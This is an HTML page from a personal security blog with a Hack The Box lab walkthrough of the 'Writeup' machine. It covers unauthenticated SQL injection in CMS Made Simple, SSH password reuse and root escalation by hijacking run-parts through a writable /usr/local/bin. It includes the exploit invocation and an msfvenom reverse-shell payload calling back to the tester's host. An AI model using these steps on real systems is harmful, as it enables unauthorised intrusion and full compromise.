@@ -1,0 +1,620 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Writeup - Hack The Box - hackcommander.io</title>
+<meta name="description" content="Writeup starts off easy with an unauthenticated vulnerability in CMS Made Simple that I exploit to dump the database credentials. After cracking the user hash, I can log in to the machine because the user re-used the same password for SSH. The priv esc is pretty nice: I have write access to /usr/local and I can write a binary payload in there that gets executed by run-parts when I SSH in because it’s called without the full path. Another nice box by jkr.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Writeup - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-writeup/">
+
+
+  <meta property="og:description" content="Writeup starts off easy with an unauthenticated vulnerability in CMS Made Simple that I exploit to dump the database credentials. After cracking the user hash, I can log in to the machine because the user re-used the same password for SSH. The priv esc is pretty nice: I have write access to /usr/local and I can write a binary payload in there that gets executed by run-parts when I SSH in because it’s called without the full path. Another nice box by jkr.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-writeup/writeup_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2019-10-12T00:00:00+02:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-writeup/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Writeup - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Writeup - Hack The Box">
+    <meta itemprop="description" content="Writeup starts off easy with an unauthenticated vulnerability in CMS Made Simple that I exploit to dump the database credentials. After cracking the user hash, I can log in to the machine because the user re-used the same password for SSH. The priv esc is pretty nice: I have write access to /usr/local and I can write a binary payload in there that gets executed by run-parts when I SSH in because it’s called without the full path. Another nice box by jkr.">
+    <meta itemprop="datePublished" content="October 12, 2019">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Writeup - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-10-12T00:00:00+02:00">October 12, 2019 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-writeup-writeup/writeup_logo.png" alt="" /></p>
+
+<p>Writeup starts off easy with an unauthenticated vulnerability in CMS Made Simple that I exploit to dump the database credentials. After cracking the user hash, I can log in to the machine because the user re-used the same password for SSH. The priv esc is pretty nice: I have write access to <code class="language-plaintext highlighter-rouge">/usr/local</code> and I can write a binary payload in there that gets executed by run-parts when I SSH in because it’s called without the full path. Another nice box by jkr.</p>
+
+<h2 id="summary">Summary</h2>
+
+<ul>
+  <li>Unauthenticated SQL injection in CMS Made Simple gives us the password hash which we can crack</li>
+  <li>The CMS user / password can be used to SSH in to the server (password re-use)</li>
+  <li>The <code class="language-plaintext highlighter-rouge">/usr/local/bin</code> directory is writable by low-priv user and we can hijack <code class="language-plaintext highlighter-rouge">run-parts</code> which is run by root when SSHing in (path abuse)</li>
+</ul>
+
+<h2 id="toolsblogs-used">Tools/Blogs used</h2>
+
+<ul>
+  <li>CMS Made Simple &lt; 2.2.10 - SQL Injection (exploits/php/webapps/46635.py)</li>
+</ul>
+
+<h3 id="portscan">Portscan</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nmap -p- 10.10.10.138
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-08 22:30 EDT
+Nmap scan report for writeup.htb (10.10.10.138)
+Host is up (0.018s latency).
+Not shown: 65533 filtered ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 105.16 seconds
+</code></pre></div></div>
+
+<h3 id="website-enumeration">Website enumeration</h3>
+
+<p>The website contains information about fail2ban or a similar kind of script running to prevent 40x errors. This means that if we try to dirbust the site we’ll probably get banned.</p>
+
+<p><img src="/assets/images/htb-writeup-writeup/1.png" alt="" /></p>
+
+<p>So I checked <code class="language-plaintext highlighter-rouge">robots.txt</code> and found the following:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#              __
+#      _(\    |@@|
+#     (__/\__ \--/ __
+#        \___|----|  |   __
+#            \ }{ /\ )_ / _\
+#            /\__/\ \__O (__
+#           (--/\--)    \__/
+#           _)(  )(_
+#          `---''---`
+
+# Disallow access to the blog until content is finished.
+User-agent: *
+Disallow: /writeup/
+</code></pre></div></div>
+
+<p>Checking out <code class="language-plaintext highlighter-rouge">http://10.10.10.138/writeup/</code> I see it’s some kind of barebone webpage.</p>
+
+<p><img src="/assets/images/htb-writeup-writeup/2.png" alt="" /></p>
+
+<p>The links just display different writeups for previous HTB boxes. I couldn’t trigger any LFI, RFI or SQL injection from <code class="language-plaintext highlighter-rouge">/writeup/index.php?page=</code></p>
+
+<p>There’s a hint at the bottom of the page that it’s <em>NOT</em> made with vim.</p>
+
+<p><img src="/assets/images/htb-writeup-writeup/3.png" alt="" /></p>
+
+<p>Checking out the source code, I can see it’s made with CMS Made Simple.</p>
+
+<p><img src="/assets/images/htb-writeup-writeup/4.png" alt="" /></p>
+
+<h3 id="sql-injection-in-cms">SQL injection in CMS</h3>
+
+<p>Checking out searchsploit, I see a whole bunch of exploits for that CMS.</p>
+
+<p><img src="/assets/images/htb-writeup-writeup/5.png" alt="" /></p>
+
+<p>The one I highlighted above is an Unauthenticated SQL Injection that allows an attacker to dump the username and password hash from the database. To exploit it, we just need to pass the URI of the CMS and the wordlist we’ll use to crack the password hash:</p>
+
+<p><code class="language-plaintext highlighter-rouge">python exploit.py -u http://10.10.10.138/writeup/ --crack -w /usr/share/wordlists/rockyou.txt</code></p>
+
+<p><img src="/assets/images/htb-writeup-writeup/6.png" alt="" /></p>
+
+<p>We just found the password for user <code class="language-plaintext highlighter-rouge">jkr</code>: <code class="language-plaintext highlighter-rouge">raykayjay9</code></p>
+
+<p>The CMS administration webpage at <code class="language-plaintext highlighter-rouge">http://10.10.10.138/writeup/admin</code> is protected by an additional HTTP basic web authentication. This is not part of the standard CMS deployment so it was probably added by the box creator. I’m not able to authenticate using the credentials I found in the database and if I try to bruteforce it I get locked out by fail2ban.</p>
+
+<p>However the credentials do work with SSH and I’m able to get a shell and the first flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ssh jkr@10.10.10.138
+jkr@10.10.10.138's password:
+Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux
+
+The programs included with the Devuan GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+jkr@writeup:~$ cat user.txt
+d4e493...
+</code></pre></div></div>
+
+<h3 id="privesc">Privesc</h3>
+
+<p>My user is part of the following groups: <code class="language-plaintext highlighter-rouge">uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)</code></p>
+
+<p>I ran through the standard Linux enumeration, checking permissions on files and directories, and noticed that I have write access to folders inside <code class="language-plaintext highlighter-rouge">/usr/local</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jkr@writeup:~$ ls -l /usr/local
+total 56
+drwx-wsr-x 2 root staff 20480 Apr 19 04:11 bin
+drwxrwsr-x 2 root staff  4096 Apr 19 04:11 etc
+drwxrwsr-x 2 root staff  4096 Apr 19 04:11 games
+drwxrwsr-x 2 root staff  4096 Apr 19 04:11 include
+drwxrwsr-x 4 root staff  4096 Apr 24 13:13 lib
+lrwxrwxrwx 1 root staff     9 Apr 19 04:11 man -&gt; share/man
+drwx-wsr-x 2 root staff 12288 Apr 19 04:11 sbin
+drwxrwsr-x 7 root staff  4096 Apr 19 04:30 share
+drwxrwsr-x 2 root staff  4096 Apr 19 04:11 src
+</code></pre></div></div>
+
+<p>However, I can’t see the contents of <code class="language-plaintext highlighter-rouge">/usr/local/bin</code> and <code class="language-plaintext highlighter-rouge">/usr/local/sbin</code>. This is not a standard Linux distro configuration so the box creator probably changed the permissions on purpose so HTB players can’t piggy-back on other players binaries.</p>
+
+<p>I copied <code class="language-plaintext highlighter-rouge">pspy</code> to the box and found a cronjob running every minute:</p>
+
+<p><img src="/assets/images/htb-writeup-writeup/7.png" alt="" /></p>
+
+<p>I don’t have access to the content of the script but it’s safe to assume that it deletes files or folders somewhere on the system. I created a test file inside <code class="language-plaintext highlighter-rouge">/usr/local/bin</code> to see if the script would delete it. After a minute, I saw that the file was removed:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jkr@writeup:/usr/local/bin$ echo test &gt; test
+jkr@writeup:/usr/local/bin$ cat test
+test
+jkr@writeup:/usr/local/bin$ cat test
+test
+jkr@writeup:/usr/local/bin$ cat test
+cat: test: No such file or directory
+</code></pre></div></div>
+
+<p>Because we can write files into <code class="language-plaintext highlighter-rouge">/usr/local/bin</code> and <code class="language-plaintext highlighter-rouge">/usr/local/sbin</code>, we can potentially get RCE since the default path for users is the following:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jkr@writeup:/usr/local/bin$ cat /etc/profile
+# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))
+# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).
+
+if [ "`id -u`" -eq 0 ]; then
+  PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+else
+  PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">/usr/local/bin</code> and <code class="language-plaintext highlighter-rouge">/usr/local/sbin</code> are preferred over the other paths so it’s clear what we need to do here:</p>
+
+<ul>
+  <li>Find the filename of something that is executed by root (that filename must be executed without the full path)</li>
+  <li>Find the trigger for executing that command as root</li>
+</ul>
+
+<p>I thought I could use <code class="language-plaintext highlighter-rouge">grep</code> or <code class="language-plaintext highlighter-rouge">iptables</code> but that didn’t work. I think it’s because the programs are executed by fail2ban which is started with a modified path as per <code class="language-plaintext highlighter-rouge">/etc/init.d/fail2ban</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PATH=/usr/sbin:/usr/bin:/sbin:/bin
+</code></pre></div></div>
+
+<p>I also noticed that the <code class="language-plaintext highlighter-rouge">run-parts</code> program is executed whenever I SSH in:</p>
+
+<p><img src="/assets/images/htb-writeup-writeup/8.png" alt="" /></p>
+
+<blockquote>
+  <p>run-parts runs all the executable files named within constraints described below, found in directory  directory. Other files and directories are silently ignored.</p>
+</blockquote>
+
+<p>I can’t make run-parts run arbitrary binaries since I can’t write <code class="language-plaintext highlighter-rouge">/etc/update-motd.d/</code> but because the program is run without the full path I can write my own <code class="language-plaintext highlighter-rouge">run-parts</code> binary to <code class="language-plaintext highlighter-rouge">/usr/local/bin</code> or <code class="language-plaintext highlighter-rouge">/usr/local/sbin</code> and it will be executed instead of the real one because the directory is located in front in the PATH variable definition.</p>
+
+<p>For the malicious binary, I use a standard linux reverse shell payload generated with Metasploit:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=10.10.14.7 LPORT=4444
+chmod +x ./shell
+</code></pre></div></div>
+
+<p>I just need to upload the file to <code class="language-plaintext highlighter-rouge">/usr/local/bin/run-parts</code> and SSH in to trigger a callback and get root privileges.</p>
+
+<p><img src="/assets/images/htb-writeup-writeup/9.png" alt="" /></p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#cms" class="page__taxonomy-item" rel="tag">cms</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#sqli" class="page__taxonomy-item" rel="tag">sqli</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-10-12T00:00:00+02:00">October 12, 2019</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-ghoul/" class="pagination--pager" title="Ghoul - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-safe/" class="pagination--pager" title="Safe - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
